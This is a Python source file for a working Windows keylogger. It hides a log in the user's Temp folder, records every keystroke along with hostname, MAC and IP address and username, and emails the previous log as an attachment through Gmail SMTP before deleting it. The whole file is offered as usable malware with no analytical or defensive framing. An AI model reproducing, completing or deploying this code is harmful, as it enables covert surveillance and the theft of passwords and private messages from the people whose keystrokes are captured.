#capture keys
import pynput
from pynput.keyboard import Key, Listener

#user name
import getpass

#sleep
import time

#wi-fi check
import requests

#date
import datetime
from datetime import date, timedelta

#email
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import os.path

#get path name
import glob

#ipv4 and MAC
import socket
import re, uuid 

ctrl_dic = {"\'\\x01\'":"a",
            "\'\\x02\'":"b",
            "\'\\x03\'":"c",
            "\'\\x04\'":"d",
            "\'\\x05\'":"e",
            "\'\\x06\'":"f",
            "\'\\x06\'":"f",
            "\'\\x07\'":"g",
            "\'\\x08\'":"h",
            "\'\\t\'":"i",
            "\'\\n\'":"j",
            "\'\\x0b\'":"k",
            "\'\\x0c\'":"l",
            "\'\\r\'":"m",
            "\'\\x0e\'":"n",
            "\'\\x0f\'":"o",
            "\'\\x10\'":"p",
            "\'\\x11\'":"q",
            "\'\\x12\'":"r",
            "\'\\x13\'":"s",
            "\'\\x14\'":"t",
            "\'\\x15\'":"u",
            "\'\\x16\'":"v",
            "\'\\x17\'":"w",
            "\'\\x18\'":"x",
            "\'\\x19\'":"y",
            "\'\\x1a\'":"z",
            }

trial = False
while trial == False:
    try:
        _ = requests.get('http://www.google.com/', timeout = 10)
        trial = True
    except requests.ConnectionError:
        trial = False

time.sleep(2)


user = getpass.getuser()
loc_dir = "AppData/Local/Temp"
loc__dir = "AppData\\Local\\Temp"
log_name = datetime.datetime.now().strftime("%d-%m-%Y") + ".txt"
capture = []
cap_list = []
pos_list = []

try:
    os.chdir("C:/Users/" + user + "/" + loc_dir)
    os.mkdir("log")   
except:
    pass


#Email
try:
    email = 'x'
    password = 'x'
    send_to_email = 'x'
    subject = 'LOG ENTRY'
    message = ""
    
    #configure file attachment
    
    temp = glob.glob("C:/Users/" + user + "/" + loc_dir + "/log/*")
    
    try:
        t1 = os.path.getctime(temp[0])
        t2 = os.path.getctime(temp[1])
        
        if t1 > t2:
            cur_num = 0
        else:
            cur_num = 1
    
    except:
        cur_num = -1   
    
    #configure file attachment
    
    file_location = glob.glob("C:/Users/" + user + "/" + loc_dir + "/log/*.txt")[cur_num].replace("\\", "\\\\").replace("/", "\\\\")
    
    msg = MIMEMultipart()
    msg['From'] = email
    msg['To'] = send_to_email
    msg['Subject'] = subject
    
    msg.attach(MIMEText(message, 'plain'))
    
    # Setup the attachment
    filename = os.path.basename(file_location)
    attachment = open(file_location, "rb")
    part = MIMEBase('application', 'octet-stream')
    part.set_payload(attachment.read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', "attachment; filename= %s" % filename)
    
    # Attach the attachment to the MIMEMultipart object
    msg.attach(part)
    
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(email, password)
    text = msg.as_string()
    server.sendmail(email, send_to_email, text)
    server.quit()
except:
    pass

#Email

files = glob.glob("C:/Users/" + user + "/" + loc_dir + "/log/*")
for f in files:
    try:
        os.remove(f)
    except:
        pass
        
        
with open("C:\\Users\\" + user + "\\" + loc__dir + "\\log\\" + log_name, "w") as log:
    log.write("<<<<<<<< Keylogger started at >>>>>>>>\n" + datetime.datetime.now().strftime("%d-%m-%Y : %A <--> %I:%M:%S %p"))
    log.write("\n\nDevice Name: " + socket.gethostname() + "\nMAC Address: " + ':'.join(re.findall('..', '%012x' % uuid.getnode())) + "\nIPV4 Address: " + socket.gethostbyname(socket.gethostname()))
    log.write("\n\nCurrent User: " + getpass.getuser() + "\n")
    log.write("-------------\n"*30)


def on_press(key):
    
    if key == Key.ctrl_l or key == Key.ctrl_r:
        capture.append(" [CTRL] ")
    
    if type(key) == pynput.keyboard._win32.KeyCode and str(key) != "<255>":      
        
        try:
            key = ctrl_dic[str(key)]
        except:
            pass
            
        if len(pos_list) == 0:
            if len(cap_list) == 1:
                capture.append(str(key).replace("'", "").upper())
            else:
                capture.append(str(key).replace("'", ""))
        else:
            if len(cap_list) == 1:
                capture.insert(pos_list[0] + 1,str(key).replace("'", "").upper())
            else:
                capture.insert(pos_list[0] + 1,str(key).replace("'", ""))  
            pos_list[0] += 1
                
    if key == Key.space:
        capture.append(' ')
    
    if key == Key.caps_lock:
        cap_list.append(1)
        if len(cap_list) == 2:
            cap_list.pop()
            cap_list.pop()
    
    if key == Key.left:
        if len(pos_list) == 0:
            pos_list.append(len(capture) - 2)
        else:
            pos_list[0] -= 1
    
    if key == Key.right:
        if len(pos_list) != 0:
            pos_list[0] += 1
        
    if key == Key.backspace:
        try:
            if len(pos_list) == 0:
                capture.pop()
                
            elif pos_list[0] >= 0:
                capture.pop(pos_list[0])
                pos_list[0] -= 1   
        except:
            pass
        
    if key == Key.enter or len(capture) > 39 or key == Key.tab:
        temp = str(capture)[1:-1].replace("'", "").replace(", ", "").replace("\"\"", "'")
        
        #with open("log.txt", "a") as log:
        with open("C:\\Users\\" + user + "\\" + loc__dir + "\\log\\" + log_name, "a") as log:
                
            log.write(datetime.datetime.now().strftime("%I:%M:%S %p > ") + temp + "\n")
            
            if len(capture) > 39:
                log.write("<<<<<<<<<< EXCEEDED CHARACTER LIMIT OF 40 >>>>>>>>>>\n")   
            
            if key == Key.tab:
                log.write("[ TAB ]\n")
            
            if key == Key.enter:
                log.write("[ ENTER ]\n")
            
        capture[:] = []
        pos_list[:] = []

def on_release(key):
    
    if key == Key.ctrl_l or key == Key.ctrl_r:
        capture.append(" [CTRL] ") 
        
        
with Listener(on_press = on_press, on_release= on_release) as listener:
    listener.join()
